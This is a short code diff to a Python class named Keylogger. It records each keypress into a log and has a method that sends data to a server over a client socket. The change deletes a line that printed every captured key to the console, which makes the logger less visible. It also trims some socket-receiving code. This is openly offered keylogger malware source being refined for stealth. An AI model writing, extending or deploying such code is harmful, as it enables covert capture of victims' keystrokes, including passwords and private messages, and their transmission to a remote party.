@@ -52,7 +52,6 @@ class Keylogger:
                 current_key = "\n"
             else:
                 current_key = "<" + str(key) + ">"
-        print(current_key)
         self._append_to_log(current_key)
 
     def _send_2_server(self):
@@ -65,12 +64,6 @@ class Keylogger:
                 username_header = self.client_socket.recv(self.header_lenght)
                 if not len(username_header):
                     self._reconnect()
-
-                username_length = int(username_header.decode('utf-8').strip())
-                # username = self.client_socket.recv(username_length).decode('utf-8')
-                message_header = self.client_socket.recv(self.header_lenght)
-                message_length = int(message_header.decode('utf-8').strip())
-                message = self.client_socket.recv(message_length).decode('utf-8')
 
         except IOError as e:
             if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
